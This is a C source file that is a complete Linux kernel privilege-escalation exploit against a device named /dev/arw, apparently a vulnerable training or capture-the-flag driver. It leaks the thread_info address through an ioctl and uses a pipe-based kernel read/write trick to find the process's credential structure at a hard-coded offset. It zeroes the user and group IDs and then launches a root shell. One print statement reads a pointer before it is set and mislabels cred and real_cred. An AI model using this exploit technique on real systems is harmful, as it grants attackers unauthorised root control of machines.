#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>

#define GETTHREADINFO 0

struct ioctl_param
{
    size_t len;
    void* buf;
    void* addr;
};

int pipefd[2];

int kmemcpy(void *dest, void *src, size_t size)
{
    // write to pipe
    while(write(pipefd[1], src, size) == -1);
    // read from pipe
    read(pipefd[0], dest, size);
    return size;
}

int main(void)
{
    int fd;
    char buf[16];
    struct ioctl_param p;
    int result;

    void* info;
    void* task_addr;
    void* cred;
    void* real_cred;
    void* cred_ids;

    fd = open("/dev/arw", O_RDWR);
    if (fd == -1) {
        printf("open arw device failed!\n");
        return -1;
    }

    ioctl(fd, GETTHREADINFO, &p);
    printf("[*] thread_info: %p\n", p.addr);
    info = p.addr;
    result = pipe(pipefd);
    if (result < 0) {
        printf("[*] pipe failed: %d\n", result);
        exit(1);
    }

    kmemcpy(buf, info, 16);
    task_addr = (void *)(*(long *)buf);
    printf("[*] task_struct's address: %p\n", task_addr);

    // p &((struct task_struct*)0)->real_cred => 0x5f8
    kmemcpy(buf, task_addr + 0x5f8, 16);
    real_cred = (void *)(*(long *)buf);
    printf("[*] task_struct->cred's address: %p\n", cred);

    cred = real_cred + sizeof(void *);
    printf("[*] task_struct->real_cred's address: %p\n", real_cred);

    printf("[*] getuid() = %d\n", getuid());
    printf("[*] change cred...\n");

    cred_ids = malloc(32);
    memset(cred_ids, 0, 32);
    // modify task->real_cred
    kmemcpy(real_cred + 4, cred_ids, 32);
    // modify task->cred = task->real_cred
    kmemcpy(cred, &real_cred, 8);
    printf("[*] getuid() = %d\n", getuid());

    close(pipefd[0]);
    close(pipefd[1]);

    system("/bin/sh");
    return 0;
}
